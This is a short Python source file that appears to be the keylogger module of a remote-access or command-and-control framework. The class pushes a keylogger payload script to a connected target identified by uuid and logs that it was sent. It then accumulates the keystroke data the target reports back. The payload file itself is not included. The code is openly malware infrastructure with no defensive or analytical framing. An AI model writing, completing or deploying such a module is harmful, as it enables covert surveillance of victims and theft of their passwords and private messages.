from dataManager.repository.userRepository import UserRepository
import logging

class Keylogger:
    def __init__(self, user_repository: UserRepository):
        self.module_name = "keylogger"
        self.payload_path = "./modules/payloads/payload_keylogger.py"
        self.user_repository: UserRepository = user_repository

    async def inject(self, reader, writer, uuid):
        user = self.user_repository.get_user(uuid)
        await user.execute(self.payload_path)
        logging.info(f"Sent keylogger to {uuid}")

    async def action(self, message, uuid):
        keylogger_data = self.user_repository.get_user(uuid).module_data.get(self.module_name, "")
        self.user_repository.set_user_module_data(uuid, self.module_name, keylogger_data + message)